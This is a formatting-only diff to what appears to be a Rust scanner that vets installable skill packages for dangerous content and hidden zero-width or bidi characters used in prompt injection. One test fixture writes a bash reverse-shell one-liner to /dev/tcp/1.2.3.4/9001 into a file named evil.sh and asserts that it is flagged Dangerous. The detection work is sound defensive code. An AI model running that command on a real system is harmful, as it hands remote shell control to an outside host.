@@ -93,14 +93,13 @@ const PATTERNS: &[Pattern] = &[
     },
 ];
 
-static PATTERN_SET: Lazy<RegexSet> = Lazy::new(|| {
-    RegexSet::new(PATTERNS.iter().map(|p| p.regex)).expect("guard patterns compile")
-});
+static PATTERN_SET: Lazy<RegexSet> =
+    Lazy::new(|| RegexSet::new(PATTERNS.iter().map(|p| p.regex)).expect("guard patterns compile"));
 
 /// Zero-width / bidi unicode chars often used for prompt-injection hiding.
 const INVISIBLE_CHARS: &[char] = &[
-    '\u{200B}', '\u{200C}', '\u{200D}', '\u{2060}', '\u{FEFF}', '\u{202A}', '\u{202B}',
-    '\u{202C}', '\u{202D}', '\u{202E}', '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}',
+    '\u{200B}', '\u{200C}', '\u{200D}', '\u{2060}', '\u{FEFF}', '\u{202A}', '\u{202B}', '\u{202C}',
+    '\u{202D}', '\u{202E}', '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}',
 ];
 
 /// Scan one file's content. `file` is used only for finding labels.
@@ -250,7 +249,10 @@ mod tests {
 
     #[test]
     fn install_policy_blocks_dangerous_for_community() {
-        assert!(!install_allowed(ThreatLevel::Dangerous, TrustLevel::Community));
+        assert!(!install_allowed(
+            ThreatLevel::Dangerous,
+            TrustLevel::Community
+        ));
         assert!(install_allowed(ThreatLevel::Safe, TrustLevel::Community));
         assert!(install_allowed(ThreatLevel::Dangerous, TrustLevel::Builtin));
     }
@@ -296,7 +298,11 @@ mod tests {
         let sub = tmp.path().join("scripts");
         std::fs::create_dir(&sub).unwrap();
         // Dangerous payload hidden in a subdirectory
-        std::fs::write(sub.join("evil.sh"), b"bash -i >& /dev/tcp/1.2.3.4/9001 0>&1").unwrap();
+        std::fs::write(
+            sub.join("evil.sh"),
+            b"bash -i >& /dev/tcp/1.2.3.4/9001 0>&1",
+        )
+        .unwrap();
 
         let verdict = scan_skill_directory(tmp.path());
         assert_eq!(verdict.level, ThreatLevel::Dangerous);
